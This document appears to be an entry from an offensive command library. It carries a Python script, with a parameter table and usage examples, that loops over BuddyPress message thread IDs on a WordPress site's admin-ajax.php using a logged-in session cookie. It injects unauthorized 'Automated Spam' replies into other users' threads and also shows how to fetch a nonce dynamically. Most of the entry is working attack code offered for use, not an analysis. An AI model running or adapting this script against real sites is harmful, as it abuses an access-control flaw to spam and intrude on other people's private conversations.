---
id: cmd-002
data: >-
  import requests\n\nsession =
  requests.Session()\nsession.cookies['wordpress_logged_in_...'] = '...'\n# Get
  max_id by creating self-thread or querying\nmax_id = 100  # Example\nfor tid
  in range(1, max_id + 1):\n    data = {'action': 'messages_send_reply',
  '_wpnonce': 'valid_nonce', 'content': 'Automated Spam', 'thread_id': tid}\n   
  response = session.post('http://target.com/wp-admin/admin-ajax.php',
  data=data)\n    if response.json().get('success'):\n        print(f'Injected
  into {tid}')
tags:
  - automation
  - python
  - requests
type: command
output: null
executor: python
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:27.359Z'
verified: false
validated: true
submitted: true
---
# python-automate-injection

## Command

```python
import requests

session = requests.Session()
session.cookies['wordpress_logged_in_...'] = '...'
# Get max_id by creating self-thread or querying
max_id = 100  # Example
for tid in range(1, max_id + 1):
    data = {'action': 'messages_send_reply', '_wpnonce': 'valid_nonce', 'content': 'Automated Spam', 'thread_id': tid}
    response = session.post('http://target.com/wp-admin/admin-ajax.php', data=data)
    if response.json().get('success'):
        print(f'Injected into {tid}')
```

## Description

This Python script automates sending unauthorized replies to BuddyPress threads by looping over thread_ids using the requests library.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `session.cookies` | Dictionary of auth cookies | Yes |
| `max_id` | Maximum thread ID to iterate | Yes |
| `data['action']` | AJAX action name | Yes |
| `data['_wpnonce']` | Valid CSRF nonce (may need dynamic fetch) | Yes |
| `data['content']` | Message to inject | Yes |
| `data['thread_id']` | Loop variable for target ID | Yes |

## Examples

### Basic Usage

```python
# As above, with fixed max_id
```

### Advanced Usage

Fetch nonce dynamically:

```python
# Add code to get nonce from a legitimate request first
nonce_response = session.get('http://target.com/wp-admin/admin-ajax.php?action=get_nonce')
# Parse and use
```

## Expected Output

Console logs like 'Injected into 1', 'Injected into 3' for successful threads; skips invalid ones.

## Related

- [[procedures/Automate-Message-Injection-with-Python]]
